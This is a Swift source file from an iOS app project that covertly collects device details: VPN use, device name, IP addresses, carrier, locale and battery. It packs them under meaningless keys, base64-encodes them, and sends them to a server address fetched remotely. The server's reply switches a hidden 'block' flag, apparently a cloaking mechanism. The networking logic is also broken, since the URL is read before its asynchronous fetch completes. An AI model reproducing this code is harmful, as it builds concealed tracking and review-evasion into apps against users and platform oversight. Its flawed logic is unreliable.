//
//  pgjofsd.swift
//  App820
//
//  Created by Вячеслав on 8/13/24.
//

import SwiftUI
import CoreTelephony

struct DeviceData {
    
    var isVPNActive: Bool
    var deviceName: String
    var deviceModel: String
    var uniqueID: String
    var networkAddresses: [String]
    var carriers: [String]
    var iosVersion: String
    var language: String
    var timeZone: String
    var isCharging: Bool
    var memoryInfo: String
    var installedApps: [String: Bool]
    var batteryLevel: Double
    var inputLanguages: [String]
    var region: String
    var usesMetricSystem: Bool
    var isFullyCharged: Bool
}

protocol SecondEndpoint {
    
    var mainURL: String { get }
    var method: String { get }
    var body: [String: Any] { get }
}

extension DeviceData: SecondEndpoint {
    
    var mainURL: String {
        
        var temp_url: String = ""
        
        fetchData { server1_0, landing_request, codeTech, error in
            
            if let error = error {
                
                print("Ошибка: \(error.localizedDescription)")
                
            } else {
                
                if let server1_0 = server1_0 {
                    
                    temp_url = server1_0
                    
                } else {
                    
                    print("Ключ 'url' не найден в JSON.")
                }
            }
        }
        
        return "https://\(temp_url)"
    }

    var method: String {
        
        return "POST"
    }
    
    var body: [String: Any] {
        
        let userData: [String: Any] = [
            
            "vivisWork": isVPNActive,
            "gfdokPS": deviceName,
            "gdpsjPjg": deviceModel,
            "poguaKFP": uniqueID,
            "gpaMFOfa": networkAddresses,
            "gciOFm": carriers,
            "bcpJFs": iosVersion,
            "GOmblx": language,
            "G0pxum": timeZone,
            "Fpvbduwm": isCharging,
            "Fpbjcv": memoryInfo,
            "bvoikOGjs": installedApps,
            "gfpbvjsoM": batteryLevel,
            "gfdosnb": inputLanguages,
            "bpPjfns": region,
            "biMpaiuf": usesMetricSystem,
            "oahgoMAOI": isFullyCharged,
            "KDhsd": false,
            "StwPp": false
        ]
        
        let jsonData = try? JSONSerialization.data(withJSONObject: userData, options: .fragmentsAllowed)
        let base64String = jsonData?.base64EncodedString() ?? ""

        return ["ud": base64String]
    }
}

class NetworkService {
    
    func sendRequest(endpoint: SecondEndpoint, completion: @escaping (Result<Bool, Error>) -> Void) {
        
        guard let url = URL(string: endpoint.mainURL) else {
            
            completion(.failure(URLError(.badURL)))
            
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = endpoint.method
        request.setValue("application/json; charset=utf-8", forHTTPHeaderField: "Content-Type")
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            if let error = error {
                
                DispatchQueue.main.async { completion(.failure(error)) }
                
                return
            }
            
            guard let data = data else {
                
                DispatchQueue.main.async { completion(.failure(URLError(.cannotParseResponse))) }
                
                return
            }
            
            DispatchQueue.main.async {
                
                do {
                    
                    if let jsonObject = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                        
                        fetchData { server1_0, landing_request, codeTech, error in
                            
                            if let error = error {
                                
                                print("Ошибка: \(error.localizedDescription)")
                                
                            } else {
                                
                                if let codeTech = codeTech {
                                    
                                    if let reloadableValue = jsonObject[codeTech] as? Bool {
                                        
                                        completion(.success(reloadableValue))
                                        
                                    } else if let responseString = String(data: data, encoding: .utf8), self.isBlockValue(responseString) {
                                        
                                        completion(.success(true))
                                        
                                    } else {
                                        
                                        completion(.success(false))
                                    }
                                    
                                } else {
                                    
                                    print("Ключ 'url' не найден в JSON.")
                                }
                            }
                        }
                        
                    } else {
                        
                        completion(.failure(URLError(.cannotParseResponse)))
                    }
                    
                } catch {
                    
                    completion(.failure(error))
                }
            }
            
        }
        .resume()
    }

    func isBlockValue(_ value: String) -> Bool {
        
        return value == "1"
    }
}

struct DeviceInfo {
    
    static func collectData() -> DeviceData {
        
        var isConnectedToVpn: Bool {
            
            let vpnProtocolsKeysIdentifiers = [
                "tap", "tun", "ppp", "ipsec", "utun", "ipsec0", "utun1", "utun2"
            ]
            
            guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
            
            let nsDict = cfDict.takeRetainedValue() as NSDictionary
            
            guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
                  let allKeys = keys.allKeys as? [String] else { return false }
            for key in allKeys {
                
                for protocolId in vpnProtocolsKeysIdentifiers
                        
                where key.starts(with: protocolId) {
                    
                    return true
                }
            }
            
            return false
        }
        
        let wifiAdress = getAddress(for: .wifi)
        let cellularAdress = getAddress(for: .cellular)
        
        let networkInfo = CTTelephonyNetworkInfo()
        let carrier = networkInfo.serviceSubscriberCellularProviders?.values
        var arrayOfCarrier = [String]()
        carrier?.forEach { arrayOfCarrier.append($0.carrierName ?? "") }
        
        let memory = String(ProcessInfo.processInfo.physicalMemory / 1073741824)
        
        let availableLanguages = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }
        
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = Double(UIDevice.current.batteryLevel * 100.0)
        
        return DeviceData(
            
            isVPNActive: isConnectedToVpn,
            deviceName: UIDevice.current.name,
            deviceModel: UIDevice.current.model,
            uniqueID: UIDevice.current.identifierForVendor?.uuidString ?? "",
            networkAddresses: [wifiAdress ?? "", cellularAdress ?? ""],
            carriers: arrayOfCarrier,
            iosVersion: UIDevice.current.systemVersion,
            language: Locale.preferredLanguages.first ?? "en",
            timeZone: TimeZone.current.identifier,
            isCharging: UIDevice.current.batteryState == .charging,
            memoryInfo: memory,
            installedApps: [:],
            batteryLevel: batteryLevel,
            inputLanguages: availableLanguages,
            region: Locale.current.regionCode ?? "",
            usesMetricSystem: Locale.current.usesMetricSystem,
            isFullyCharged: batteryLevel == 100
        )
    }
    
    static  func getAddress(for network: Network) -> String? {
        var address: String?
        
        // Get list of all interfaces on the local machine:
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        guard getifaddrs(&ifaddr) == 0 else { return nil }
        guard let firstAddr = ifaddr else { return nil }
        
        // For each interface ...
        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            
            // Check for IPv4 or IPv6 interface:
            let addrFamily = interface.ifa_addr.pointee.sa_family
            if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
                
                // Check interface name:
                let name = String(cString: interface.ifa_name)
                if name == network.rawValue {
                    
                    // Convert interface address to a human readable string:
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                                &hostname, socklen_t(hostname.count),
                                nil, socklen_t(0), NI_NUMERICHOST)
                    address = String(cString: hostname)
                }
            }
        }
        freeifaddrs(ifaddr)
        
        return address
    }
}

enum Network: String {
    
    case wifi = "en0"
    case cellular = "pdp_ip0"
}

func fetchData(completion: @escaping (String?, String?, String?, Error?) -> Void) {
    
    guard let url = URL(string: DataManager().storage_domain) else {
        completion(nil, nil, nil, NSError(domain: "Invalid URL", code: 0, userInfo: nil))
        return
    }
    
    let task = URLSession.shared.dataTask(with: url) { data, response, error in
        if let error = error {
            completion(nil, nil, nil, error)
            return
        }
        
        guard let data = data else {
            completion(nil, nil, nil, NSError(domain: "No data", code: 0, userInfo: nil))
            return
        }
        
        do {
            if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                
                let server1_0 = json["server1_0"] as? String
                let landing_request = json["landing_request"] as? String
                let codeTech = json["codeTech"] as? String
                
                completion(server1_0, landing_request, codeTech, nil)
                
            } else {
                
                completion(nil, nil, nil, NSError(domain: "Invalid JSON format", code: 0, userInfo: nil))
            }
            
        } catch {
            
            completion(nil, nil, nil, error)
        }
    }
    
    task.resume()
}
